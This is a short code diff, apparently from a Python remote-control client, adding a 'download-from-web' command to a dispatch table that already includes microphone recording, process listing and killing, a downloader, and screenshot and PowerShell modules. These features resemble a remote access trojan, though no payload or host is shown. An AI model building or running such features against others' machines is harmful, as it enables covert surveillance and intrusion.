@@ -16,6 +16,7 @@ import pyutils.network_utils as nu
 import pyutils.powershell_utils as pu
 import pyutils.screenshot_handling as sh
 import pyutils.copier as c
+import pyutils.uploader as up
 
 Buffer = 2
 Interval = 10
@@ -79,6 +80,7 @@ def handle_input(message: str):
         "audio-record": a.handle_mic,
         "get-processes": lu.processes,
         "downloader": d.downloader,
+        "download-from-web": up.download_from_web,
         "kill": lu.kill_process_cmd,
         "kill-by-name": lu.kill_all_processes_by_name,
         "repeat-kill-proc": lu.repeat_kill_by_name,
